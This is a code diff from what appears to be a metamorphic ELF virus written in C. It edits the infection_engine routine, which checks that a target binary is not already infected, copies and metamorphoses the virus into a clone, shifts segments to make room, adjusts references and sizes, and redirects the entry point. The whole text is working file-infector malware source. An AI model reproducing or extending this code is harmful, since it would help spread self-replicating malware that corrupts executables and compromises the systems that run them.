@@ -70,6 +70,7 @@ static bool	define_shift_amount(const struct entry *file_entry,
 	const size_t	p_memsz = file_entry->safe_phdr->p_memsz;
 	const size_t	p_align = file_entry->safe_phdr->p_align;
 
+	// shift_amount aligned to Elf64 Segments alignement requirements
 	*shift_amount = ALIGN(full_virus_size, PAGE_ALIGNMENT);
 
 	const size_t	end_padding = (p_memsz % p_align) + *shift_amount;
@@ -81,25 +82,25 @@ static bool	define_shift_amount(const struct entry *file_entry,
 }
 
 bool		infection_engine(struct virus_header *vhdr, \
-			struct safe_ptr clone_ref, struct safe_ptr file_ref)
+			struct safe_ptr clone_ref, \
+			struct safe_ptr file_ref, size_t *shift_amount)
 {
 	struct entry	file_entry;
 	struct entry	clone_entry;
-	const size_t	*loader_off = &file_entry.end_of_last_section;
-	size_t		shift_amount = 0;                                       // changed by <define_shift_amount>
+	const size_t	*loader_off      = &file_entry.end_of_last_section;     // init by <find_entry>
 	uint64_t	*seed            = &vhdr->seed;                         // changed by <generate_seed>
-	size_t		*full_virus_size = &vhdr->full_virus_size;              // changed by <metamorph_self>
+	size_t		*full_virus_size = &vhdr->full_virus_size;              // changed by <metamorph_clone>
 
 	if (!find_entry(&file_entry, file_ref)
 	|| !not_infected(&file_entry, file_ref, vhdr->dist_header_loader)
 	|| !copy_virus_to_clone(clone_ref, &file_entry, vhdr)
 	|| !generate_seed(seed, file_ref)
 	|| !metamorph_clone(clone_ref, *loader_off, *seed, full_virus_size, vhdr)
-	|| !define_shift_amount(&file_entry, &shift_amount, *full_virus_size)
-	|| !copy_client_to_clone(clone_ref, file_ref, *loader_off, shift_amount)
-	|| !adjust_references(clone_ref, shift_amount, *loader_off)
+	|| !define_shift_amount(&file_entry, shift_amount, *full_virus_size)
+	|| !copy_client_to_clone(clone_ref, file_ref, *loader_off, *shift_amount)
+	|| !adjust_references(clone_ref, *shift_amount, *loader_off)
 	|| !find_entry(&clone_entry, clone_ref)
-	|| !adjust_sizes(&clone_entry, shift_amount, *full_virus_size)
+	|| !adjust_sizes(&clone_entry, *shift_amount, *full_virus_size)
 	|| !setup_virus_header(clone_ref, *loader_off, *vhdr)
 	|| !change_entry(clone_ref, &file_entry))
 		return errors(ERR_THROW, _ERR_INFECTION_ENGINE);
